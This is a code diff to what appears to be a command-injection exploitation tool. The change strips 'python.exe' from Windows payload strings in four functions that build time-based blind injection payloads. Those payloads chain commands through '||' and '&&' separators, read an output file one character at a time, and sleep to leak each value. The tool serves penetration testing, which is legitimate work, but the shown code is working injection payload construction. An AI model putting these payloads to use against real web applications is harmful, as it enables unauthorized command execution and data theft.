@@ -113,7 +113,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request_method):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
+    python_payload = settings.WIN_PYTHON_DIR + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
@@ -121,8 +121,8 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
                 "for /f \"delims=\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
     if separator == "&&" :
       if http_request_method == "POST":
@@ -135,8 +135,8 @@ def decision_alter_shell(separator, j, TAG, OUTPUT_TEXTFILE, delay, http_request
                 "for /f \"delims=\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
   else:  
     if separator == ";" :
@@ -317,7 +317,7 @@ __Warning__: The alternative shells are still experimental.
 """
 def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_request_method):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
+    python_payload = settings.WIN_PYTHON_DIR + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print len(file.read().strip())\""
     if separator == "||" :
       pipe = "|"
       payload = (pipe +
@@ -328,8 +328,8 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
                 "for /f \"delims=\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
     if separator == "&&" :
       if http_request_method == "POST":
@@ -345,8 +345,8 @@ def cmd_execution_alter_shell(separator, cmd, j, OUTPUT_TEXTFILE, delay, http_re
                 "for /f \"delims=\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" +str(j) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
   else: 
     if separator == ";" :
@@ -488,15 +488,15 @@ __Warning__: The alternative shells are still experimental.
 """
 def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print ord(file.read().strip()[" + str(num_of_chars - 1) + "][0]); exit(0)\""
+    python_payload = settings.WIN_PYTHON_DIR + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print ord(file.read().strip()[" + str(num_of_chars - 1) + "][0]); exit(0)\""
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
                 "for /f \"delims=\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
     if separator == "&&" :
       if http_request_method == "POST":
@@ -508,8 +508,8 @@ def get_char_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, d
                 "for /f \"delims=\" %i in ('cmd /c " + 
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay + 1) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
   else: 
     if separator == ";" :
@@ -642,15 +642,15 @@ __Warning__: The alternative shells are still experimental.
 """
 def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, delay, http_request_method):
   if settings.TARGET_OS == "win":
-    python_payload = settings.WIN_PYTHON_DIR + "python.exe -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print file.readlines()[0][" + str(num_of_chars - 1) + "]; exit(0)\""
+    python_payload = settings.WIN_PYTHON_DIR + " -c \"with open(r'" + OUTPUT_TEXTFILE + "') as file: print file.readlines()[0][" + str(num_of_chars - 1) + "]; exit(0)\""
     if separator == "||" :
       pipe = "|"
       payload = (pipe + " "
                 "for /f \"delims=\" %i in ('cmd /c " +
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
     if separator == "&&" :
       if http_request_method == "POST":
@@ -662,8 +662,8 @@ def fp_result_alter_shell(separator, OUTPUT_TEXTFILE, num_of_chars, ascii_char, 
                 "for /f \"delims=\" %i in ('cmd /c " + 
                 python_payload +
                 "') do if %i==" + str(ascii_char) + " "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
-                "(cmd /c " + settings.WIN_PYTHON_DIR + "python.exe -c \"import time; time.sleep(0)\"" + ")"
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(" + str(delay) + ")\"" + ") else "
+                "(cmd /c " + settings.WIN_PYTHON_DIR + " -c \"import time; time.sleep(0)\"" + ")"
                 )
   else: 
     if separator == ";" :
